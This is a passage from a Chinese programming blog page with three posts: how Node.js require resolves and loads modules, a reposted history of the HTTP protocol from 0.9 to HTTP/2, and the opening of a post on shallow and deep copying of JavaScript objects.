-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.resolve = <span class="function"><span class="keyword">function</span>(<span class="params">request</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Module._resolveFilename(request, self);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法</span></span><br><span class="line"><span class="built_in">require</span>.resolve(<span class="string">'a.js'</span>)</span><br><span class="line"><span class="comment">// 返回 /home/ruanyf/tmp/a.js</span></span><br></pre></td></tr></table></figure>
-<h2 id="五、加载模块"><a href="#五、加载模块" class="headerlink" title="五、加载模块"></a>五、加载模块</h2><p>有了模块的绝对路径，就可以加载该模块了。下面是 module.load 方法的源码。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Module.prototype.load = <span class="function"><span class="keyword">function</span>(<span class="params">filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> extension = path.extname(filename) || <span class="string">'.js'</span>;</span><br><span class="line">  <span class="keyword">if</span> (!Module._extensions[extension]) extension = <span class="string">'.js'</span>;</span><br><span class="line">  Module._extensions[extension](<span class="keyword">this</span>, filename);</span><br><span class="line">  <span class="keyword">this</span>.loaded = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>上面代码中，首先确定模块的后缀名，不同的后缀名对应不同的加载方法。下面是 .js 和 .json 后缀名对应的处理方法。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Module._extensions[<span class="string">'.js'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">module, filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = fs.readFileSync(filename, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="built_in">module</span>._compile(stripBOM(content), filename);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Module._extensions[<span class="string">'.json'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">module, filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> content = fs.readFileSync(filename, <span class="string">'utf8'</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">module</span>.exports = <span class="built_in">JSON</span>.parse(stripBOM(content));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    err.message = filename + <span class="string">': '</span> + err.message;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>这里只讨论 js 文件的加载。首先，将模块文件读取成字符串，然后剥离 utf8 编码特有的BOM文件头，最后编译该模块。</p>
-<p>module._compile 方法用于模块的编译。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Module.prototype._compile = <span class="function"><span class="keyword">function</span>(<span class="params">content, filename</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">var</span> args = [self.exports, <span class="built_in">require</span>, self, filename, dirname];</span><br><span class="line">  <span class="keyword">return</span> compiledWrapper.apply(self.exports, args);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>上面的代码基本等同于下面的形式。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 模块源码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>也就是说，模块的加载实质上就是，注入exports、require、module三个全局变量，然后执行模块的源码，然后将模块的 exports 变量的值输出。</p>
-<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><p><a href="http://www.ruanyifeng.com/blog/2015/05/require.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2015/05/require.html</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-09-04T06:45:23.000Z"><a href="/2016/09/04/计算机网络/HTTP 协议入门/">2016-09-04</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2016/09/04/计算机网络/HTTP 协议入门/">HTTP 协议入门</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="HTTP-协议入门"><a href="#HTTP-协议入门" class="headerlink" title="HTTP 协议入门"></a>HTTP 协议入门</h1><p>HTTP 协议是互联网的基础协议，也是网页开发的必备知识，最新版本 HTTP/2 更是让它成为技术热点。<br>本文介绍 HTTP 协议的历史演变和设计思路。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/http01.jpg" alt=""></p>
-<h2 id="一、HTTP-0-9"><a href="#一、HTTP-0-9" class="headerlink" title="一、HTTP/0.9"></a>一、HTTP/0.9</h2><p>HTTP 是基于 TCP/IP 协议的<a href="http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html" target="_blank" rel="noopener"><strong>应用层协议</strong></a>。它不涉及数据包（packet）传输，主要规定了客户端和服务器之间的通信格式，默认使用80端口。</p>
-<p>最早版本是1991年发布的0.9版。该版本极其简单，只有一个命令<code>GET</code>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html</span><br></pre></td></tr></table></figure>
-<p>上面命令表示，TCP 连接（connection）建立后，客户端向服务器请求（request）网页<code>index.html</code>。</p>
-<p>协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;Hello World&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>服务器发送完毕，就关闭TCP连接。</p>
-<h2 id="二、HTTP-1-0"><a href="#二、HTTP-1-0" class="headerlink" title="二、HTTP/1.0"></a>二、HTTP/1.0</h2><h3 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h3><p>1996年5月，HTTP/1.0 版本发布，内容大大增加。</p>
-<p>首先，任何格式的内容都可以发送。这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。这为互联网的大发展奠定了基础。</p>
-<p>其次，除了<code>GET</code>命令，还引入了<code>POST</code>命令和<code>HEAD</code>命令，丰富了浏览器与服务器的互动手段。</p>
-<p>再次，HTTP请求和回应的格式也变了。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。</p>
-<p>其他的新增功能还包括状态码（status code）、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等。</p>
-<h3 id="2-2-请求格式"><a href="#2-2-请求格式" class="headerlink" title="2.2 请求格式"></a>2.2 请求格式</h3><p>下面是一个1.0版的HTTP请求的例子。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-<p>可以看到，这个格式与0.9版有很大变化。</p>
-<p>第一行是请求命令，必须在尾部添加协议版本（<code>HTTP/1.0</code>）。后面就是多行头信息，描述客户端的情况。</p>
-<h3 id="2-3-回应格式"><a href="#2-3-回应格式" class="headerlink" title="2.3 回应格式"></a>2.3 回应格式</h3><p>服务器的回应如下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK </span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;Hello World&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>回应的格式是”头信息 + 一个空行（<code>\r\n</code>） + 数据”。其中，第一行是”协议版本 + 状态码（status code） + 状态描述”。</p>
-<h3 id="2-4-Content-Type-字段"><a href="#2-4-Content-Type-字段" class="headerlink" title="2.4 Content-Type 字段"></a>2.4 Content-Type 字段</h3><p>关于字符的编码，1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是<code>Content-Type</code>字段的作用。</p>
-<p>下面是一些常见的<code>Content-Type</code>字段的值。</p>
-<ul>
-<li>text/plain</li>
-<li>text/html</li>
-<li>text/css</li>
-<li>image/jpeg</li>
-<li>image/png</li>
-<li>image/svg+xml</li>
-<li>audio/mp4</li>
-<li>video/mp4</li>
-<li>application/javascript</li>
-<li>application/pdf</li>
-<li>application/zip</li>
-<li>application/atom+xml</li>
-</ul>
-<p>这些数据类型总称为<code>MIME type</code>，每个值包括一级类型和二级类型，之间用斜杠分隔。</p>
-<p>除了预定义的类型，厂商也可以自定义类型。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/vnd.debian.binary-package</span><br></pre></td></tr></table></figure>
-<p>上面的类型表明，发送的是Debian系统的二进制数据包。</p>
-<p><code>MIME type</code>还可以在尾部使用分号，添加参数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
-<p>上面的类型表明，发送的是网页，而且编码是UTF-8。</p>
-<p>客户端请求的时候，可以使用<code>Accept</code>字段声明自己可以接受哪些数据格式。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-<p>上面代码中，客户端声明自己可以接受任何格式的数据。</p>
-<p><code>MIME type</code>不仅用在HTTP协议，还可以用在其他地方，比如HTML网页。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">  &lt;!-- 等同于 --&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot; /&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="2-5-Content-Encoding-字段"><a href="#2-5-Content-Encoding-字段" class="headerlink" title="2.5 Content-Encoding 字段"></a>2.5 Content-Encoding 字段</h3><p>由于发送的数据可以是任何格式，因此可以把数据压缩后再发送。<code>Content-Encoding</code>字段说明数据的压缩方法。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
-<p>客户端在请求时，用<code>Accept-Encoding</code>字段说明自己可以接受哪些压缩方法。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
-<h3 id="2-6-缺点"><a href="#2-6-缺点" class="headerlink" title="2.6 缺点"></a>2.6 缺点</h3><p>HTTP/1.0 版的主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。</p>
-<p>TCP连接的新建成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢（slow start）。所以，HTTP 1.0版本的性能比较差。随着网页加载的外部资源越来越多，这个问题就愈发突出了。</p>
-<p>为了解决这个问题，有些浏览器在请求时，用了一个非标准的<code>Connection</code>字段。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-<p>这个字段要求服务器不要关闭TCP连接，以便其他请求复用。服务器同样回应这个字段。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-<p>一个可以复用的TCP连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段，不同实现的行为可能不一致，因此不是根本的解决办法。</p>
-<h2 id="三、HTTP-1-1"><a href="#三、HTTP-1-1" class="headerlink" title="三、HTTP/1.1"></a>三、HTTP/1.1</h2><p>1997年1月，HTTP/1.1 版本发布，只比 1.0 版本晚了半年。它进一步完善了 HTTP 协议，一直用到了20年后的今天，直到现在还是最流行的版本。</p>
-<h3 id="3-1-持久连接"><a href="#3-1-持久连接" class="headerlink" title="3.1 持久连接"></a>3.1 持久连接</h3><p>1.1 版的最大变化，就是引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明<code>Connection: keep-alive</code>。</p>
-<p>客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。不过，规范的做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭TCP连接。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p>目前，对于同一个域名，大多数浏览器允许同时建立6个持久连接。</p>
-<h3 id="3-2-管道机制"><a href="#3-2-管道机制" class="headerlink" title="3.2 管道机制"></a>3.2 管道机制</h3><p>1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。</p>
-<p>举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。</p>
-<h3 id="3-3-Content-Length-字段"><a href="#3-3-Content-Length-字段" class="headerlink" title="3.3 Content-Length 字段"></a>3.3 Content-Length 字段</h3><p>一个TCP连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。这就是<code>Content-length</code>字段的作用，声明本次回应的数据长度。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 3495</span><br></pre></td></tr></table></figure>
-<p>上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。</p>
-<p>在1.0版中，<code>Content-Length</code>字段不是必需的，因为浏览器发现服务器关闭了TCP连接，就表明收到的数据包已经全了。</p>
-<h3 id="3-4-分块传输编码"><a href="#3-4-分块传输编码" class="headerlink" title="3.4 分块传输编码"></a>3.4 分块传输编码</h3><p>使用<code>Content-Length</code>字段的前提条件是，服务器发送回应之前，必须知道回应的数据长度。</p>
-<p>对于一些很耗时的动态操作来说，这意味着，服务器要等到所有操作完成，才能发送数据，显然这样的效率不高。更好的处理方法是，产生一块数据，就发送一块，采用”流模式”（stream）取代”缓存模式”（buffer）。</p>
-<p>因此，1.1版规定可以不使用<code>Content-Length</code>字段，而使用<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81" target="_blank" rel="noopener">“分块传输编码”</a>（chunked transfer encoding）。只要请求或回应的头信息有<code>Transfer-Encoding</code>字段，就表明回应将由数量未定的数据块组成。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
-<p>每个非空的数据块之前，会有一个16进制的数值，表示这个块的长度。最后是一个大小为0的块，就表示本次回应的数据发送完了。下面是一个例子。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"> </span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
-<h3 id="3-5-其他功能"><a href="#3-5-其他功能" class="headerlink" title="3.5 其他功能"></a>3.5 其他功能</h3><p>1.1版还新增了许多动词方法：<code>PUT</code>、<code>PATCH</code>、<code>HEAD</code>、 <code>OPTIONS</code>、<code>DELETE</code>。</p>
-<p>另外，客户端请求的头信息新增了<code>Host</code>字段，用来指定服务器的域名。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Host: www.example.com</span><br></pre></td></tr></table></figure>
-<p>有了<code>Host</code>字段，就可以将请求发往同一台服务器上的不同网站，为虚拟主机的兴起打下了基础。</p>
-<h3 id="3-6-缺点"><a href="#3-6-缺点" class="headerlink" title="3.6 缺点"></a>3.6 缺点</h3><p>虽然1.1版允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为<a href="https://zh.wikipedia.org/wiki/%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E" target="_blank" rel="noopener">“队头堵塞”</a>（Head-of-line blocking）。</p>
-<p>为了避免这个问题，只有两种方法：一是减少请求数，二是同时多开持久连接。这导致了很多的网页优化技巧，比如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等等。如果HTTP协议设计得更好一些，这些额外的工作是可以避免的。</p>
-<h2 id="四、SPDY-协议"><a href="#四、SPDY-协议" class="headerlink" title="四、SPDY 协议"></a>四、SPDY 协议</h2><p>2009年，谷歌公开了自行研发的 SPDY 协议，主要解决 HTTP/1.1 效率不高的问题。</p>
-<p>这个协议在Chrome浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。</p>
-<h2 id="五、HTTP-2"><a href="#五、HTTP-2" class="headerlink" title="五、HTTP/2"></a>五、HTTP/2</h2><p>2015年，HTTP/2 发布。它不叫 HTTP/2.0，是因为标准委员会不打算再发布子版本了，下一个新版本将是 HTTP/3。</p>
-<h3 id="5-1-二进制协议"><a href="#5-1-二进制协议" class="headerlink" title="5.1 二进制协议"></a>5.1 二进制协议</h3><p>HTTP/1.1 版的头信息肯定是文本（ASCII编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”（frame）：头信息帧和数据帧。</p>
-<p>二进制协议的一个好处是，可以定义额外的帧。HTTP/2 定义了近十种帧，为将来的高级应用打好了基础。如果使用文本实现这种功能，解析数据将会变得非常麻烦，二进制解析则方便得多。</p>
-<h3 id="5-2-多工"><a href="#5-2-多工" class="headerlink" title="5.2 多工"></a>5.2 多工</h3><p>HTTP/2 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”。</p>
-<p>举例来说，在一个TCP连接里面，服务器同时收到了A请求和B请求，于是先回应A请求，结果发现处理过程非常耗时，于是就发送A请求已经处理好的部分， 接着回应B请求，完成后，再发送A请求剩下的部分。</p>
-<p>这样双向的、实时的通信，就叫做多工（Multiplexing）。</p>
-<h3 id="5-3-数据流"><a href="#5-3-数据流" class="headerlink" title="5.3 数据流"></a>5.3 数据流</h3><p>因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。</p>
-<p>HTTP/2 将每个请求或回应的所有数据包，称为一个数据流（stream）。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流ID，用来区分它属于哪个数据流。另外还规定，客户端发出的数据流，ID一律为奇数，服务器发出的，ID为偶数。</p>
-<p>数据流发送到一半的时候，客户端和服务器都可以发送信号（<code>RST_STREAM</code>帧），取消这个数据流。1.1版取消数据流的唯一方法，就是关闭TCP连接。这就是说，HTTP/2 可以取消某一次请求，同时保证TCP连接还打开着，可以被其他请求使用。</p>
-<p>客户端还可以指定数据流的优先级。优先级越高，服务器就会越早回应。</p>
-<h3 id="5-4-头信息压缩"><a href="#5-4-头信息压缩" class="headerlink" title="5.4 头信息压缩"></a>5.4 头信息压缩</h3><p>HTTP 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如<code>Cookie</code>和<code>User Agent</code>，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。</p>
-<p>HTTP/2 对这一点做了优化，引入了头信息压缩机制（header compression）。一方面，头信息使用<code>gzip</code>或<code>compress</code>压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就提高速度了。</p>
-<h3 id="5-5-服务器推送"><a href="#5-5-服务器推送" class="headerlink" title="5.5 服务器推送"></a>5.5 服务器推送</h3><p>HTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送（server push）。</p>
-<p>常见场景是客户端请求一个网页，这个网页里面包含很多静态资源。正常情况下，客户端必须收到网页后，解析HTML源码，发现有静态资源，再发出静态资源请求。其实，服务器可以预期到客户端请求网页后，很可能会再请求静态资源，所以就主动把这些静态资源随着网页一起发给客户端了。</p>
-<h3 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h3><p><a href="http://kamranahmed.info/blog/2016/08/13/http-in-depth/" target="_blank" rel="noopener">Journey to HTTP/2</a>, by Kamran Ahmed<br><a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol" target="_blank" rel="noopener">HTTP</a>, by Wikipedia<br><a href="https://tools.ietf.org/html/rfc1945" target="_blank" rel="noopener">HTTP/1.0 Specification</a><br><a href="https://http2.github.io/http2-spec/" target="_blank" rel="noopener">HTTP/2 Specification</a></p>
-<h3 id="七、原文"><a href="#七、原文" class="headerlink" title="七、原文"></a>七、原文</h3><p><a href="http://www.ruanyifeng.com/blog/2016/08/http.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/08/http.html</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2016-08-05T14:16:53.000Z"><a href="/2016/08/05/Node.js_JS基础/如何编写一个 json对象的拷贝函数/">2016-08-05</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2016/08/05/Node.js_JS基础/如何编写一个 json对象的拷贝函数/">如何编写一个 json对象的拷贝函数</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <p>浅拷贝，比如浅拷贝对象A时，对象B将拷贝A的所有属性，如果属性是引用类型，B将拷贝地址，若果属性是基本类型，B将复制其值。浅拷贝的缺点是如果你修改了对象B中引用类型属性，你同时也会影响到对象A。</p>
-<p>深拷贝会完全拷贝所有数据，优点是拷贝双方不会相互依赖，比如修改了一方的引用类型属性，不会影响到另一方。缺点是拷贝的速度更慢，代价更大 （我的理解是耗费了更多内存空间）。</p>
-<h2 id="浅拷贝实现"><a href="#浅拷贝实现" class="headerlink" title="浅拷贝实现"></a>浅拷贝实现</h2><p>1、使用 ES6 的 Object.assign，其内部实现就是浅拷贝，并剔除了目标对象的原型方法</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  p: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">Object</span>.assign(&#123;&#125;, a);</span><br><span class="line"><span class="built_in">console</span>.log(b.p == a.p);</span><br></pre></td></tr></table></figure>
-<p>2、遍历对象属性</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowClone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!obj || <span class="keyword">typeof</span> obj !== <span class="string">'object'</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'error arguments'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> targetObj = obj.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class="line">      targetObj[key] = obj[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> targetObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="深拷贝实现"><a href="#深拷贝实现" class="headerlink" title="深拷贝实现"></a>深拷贝实现</h2><p>1、利用 JSON 序列化实现一个深拷贝，缺点是无法复制函数，并且丢失抛弃对象的 constructor 和原型链</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;</span><br><span class="line">  arr: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  obj: &#123; <span class="attr">key</span>: <span class="string">'value'</span> &#125;,</span><br><span class="line">  func()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = deepClone(o1);</span><br><span class="line"><span class="built_in">console</span>.log(o2); <span class="comment">// =&gt; &#123;arr: [1,2,3], obj: &#123;key: 'value'&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-<p>2、利用递归实现深拷贝，可以复制函数，同样会丢失抛弃对象的 constructor 和原型链，但是对于拷贝 json 对象的话足够了</p>
